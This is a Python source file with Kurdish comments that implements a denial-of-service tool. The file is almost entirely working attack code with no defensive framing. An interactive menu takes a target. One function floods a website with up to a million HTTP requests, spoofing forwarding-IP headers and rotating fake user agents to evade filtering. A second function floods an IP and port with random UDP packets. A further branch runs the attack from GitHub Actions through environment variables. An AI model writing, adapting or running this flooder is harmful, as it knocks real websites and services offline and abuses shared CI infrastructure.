# ناوی فایل: my_code.py

import asyncio
import aiohttp
import random
import socket
from faker import Faker
import os
import sys

fake = Faker()

async def website_attack(target_url, threads=300, total_requests=1000000):
    packet_count = 0
    lock = asyncio.Lock()
    sem = asyncio.Semaphore(1000)

    def random_ip():
        return ".".join(str(random.randint(1, 255)) for _ in range(4))

    def random_user_agent():
        android_versions = ['10', '11', '12', '13', '14']
        ios_versions = ['14_0', '15_2', '16_3', '17_1']
        chrome_versions = [f"{random.randint(100, 122)}.0.{random.randint(1000, 4999)}.100"]
        safari_versions = [f"{random.randint(13, 17)}.0"]
        android_devices = ['SM-G991B', 'SM-A205U', 'Pixel 6', 'Redmi Note 10', 'OnePlus 9', 'Realme GT', 'Infinix Zero']
        iphone_models = ['iPhone X', 'iPhone 11', 'iPhone 12', 'iPhone 13 Pro', 'iPhone 14 Pro Max']
        ipad_models = ['iPad Pro', 'iPad Air', 'iPad Mini']

        ua_type = random.choice(['android', 'iphone', 'ipad', 'windows', 'mac'])

        if ua_type == 'android':
            device = random.choice(android_devices)
            version = random.choice(android_versions)
            chrome = random.choice(chrome_versions)
            return f"Mozilla/5.0 (Linux; Android {version}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Mobile Safari/537.36"
        elif ua_type == 'iphone':
            ios = random.choice(ios_versions)
            model = random.choice(iphone_models)
            safari = random.choice(safari_versions)
            return f"Mozilla/5.0 (iPhone; CPU {model} OS {ios} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari} Mobile/15E148 Safari/604.1"
        elif ua_type == 'ipad':
            ios = random.choice(ios_versions)
            model = random.choice(ipad_models)
            safari = random.choice(safari_versions)
            return f"Mozilla/5.0 (iPad; CPU {model} OS {ios} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari} Safari/604.1"
        elif ua_type == 'windows':
            win_version = random.choice(['10.0', '6.3', '6.1'])
            chrome = random.choice(chrome_versions)
            return f"Mozilla/5.0 (Windows NT {win_version}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36"
        elif ua_type == 'mac':
            mac_version = random.choice(['10_15_7', '11_2_3', '12_6'])
            safari = random.choice(safari_versions)
            return f"Mozilla/5.0 (Macintosh; Intel Mac OS X {mac_version}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari} Safari/605.1.15"
        else:
            return "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"

    async def send_packet(session):
        nonlocal packet_count
        while True:
            async with lock:
                if packet_count >= total_requests:
                    return
                packet_count += 1
                current = packet_count

            headers = {
                "User-Agent": random_user_agent(),
                "X-Forwarded-For": random_ip(),
                "X-Real-IP": random_ip(),
                "Accept": "*/*",
                "Connection": "keep-alive"
            }

            try:
                async with sem:
                    async with session.get(
                        target_url,
                        headers=headers,
                        timeout=aiohttp.ClientTimeout(total=7)
                    ) as resp:
                        print(f"[+] Packet {current} sent | Status: {resp.status}")
            except Exception as e:
                print(f"[-] Packet {current} failed or timed out: {str(e)[:50]}")

    connector = aiohttp.TCPConnector(limit=0, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(send_packet(session)) for _ in range(threads)]
        await asyncio.gather(*tasks)


def udp_attack(ip, port, packet_size=1024, delay=0.0001):
    data = random._urandom(packet_size)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    try:
        while sent < 10000:  # سنووردار بکە بۆ 10000 پاکێج
            sock.sendto(data, (ip, port))
            sent += 1
            print(f"[+] Sent {sent} packets to {ip}:{port}")
            if delay:
                asyncio.sleep(delay)
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        sock.close()


def run_my_script(website_url):
    print(f"دەستم کرد بە وەرگرتنی زانیاری لە: {website_url}")
    
    # وەرگرتنی ڕێکخستنەکان لە environment variables
    target = os.environ.get('TARGET_URL', website_url)
    attack_type = os.environ.get('ATTACK_TYPE', 'website')
    
    print(f"[*] Target: {target}")
    print(f"[*] Attack Type: {attack_type}")
    
    try:
        if attack_type == 'website':
            threads = int(os.environ.get('THREADS', '100'))
            requests = int(os.environ.get('REQUESTS', '10000'))
            print(f"[*] Threads: {threads}")
            print(f"[*] Requests: {requests}")
            asyncio.run(website_attack(target, threads, requests))
        elif attack_type == 'udp':
            # بۆ UDP پێویستی بە IP:PORT هەیە
            if ':' in target:
                ip, port = target.split(':')
                port = int(port)
                udp_attack(ip, port)
            else:
                print("[!] UDP attack needs IP:PORT format")
    except KeyboardInterrupt:
        print("\n[×] Stopped by user.")
    except Exception as e:
        print(f"[!] Error in attack: {e}")
    
    return "سەرکەوتوو بوو!"


def main():
    print(" -- @DevMuhamed\n")
    print("[1] Website")
    print("[2] UDP")
    choice = input("\n[+] Choose: ").strip()

    if choice == "1":
        url = input(" -- @S_C_O_T_x\n\n [×] ENTER TARGET URL: ").strip()
        print(f"\n>>> TARGET: {url}")
        print(f">>> THREADS: 300")
        print(f">>> TOTAL REQUESTS: 1000000")
        print(f">>> TIMEOUT PER REQUEST: 3s\n")
        try:
            asyncio.run(website_attack(url))
        except KeyboardInterrupt:
            print("\n[×] Stopped by user.")
    elif choice == "2":
        ip_port = input("\n [+] Enter IP:PORT > ").strip()
        if ':' not in ip_port:
            print("[!] Invalid format. Use IP:PORT")
            return
        ip, port = ip_port.split(":")
        try:
            port = int(port)
        except ValueError:
            print("[!] Invalid port number.")
            return
        udp_attack(ip, port)
    else:
        print("[!] Invalid choice.")

if __name__ == "__main__":
    # ئەگەر لە GitHub Actions بێت، ئەم کۆدە ڕانابە
    if os.environ.get('GITHUB_ACTIONS') == 'true':
        target_url = os.environ.get('TARGET_URL', '')
        if target_url:
            run_my_script(target_url)
        else:
            print("No target URL provided")
    else:
        main()
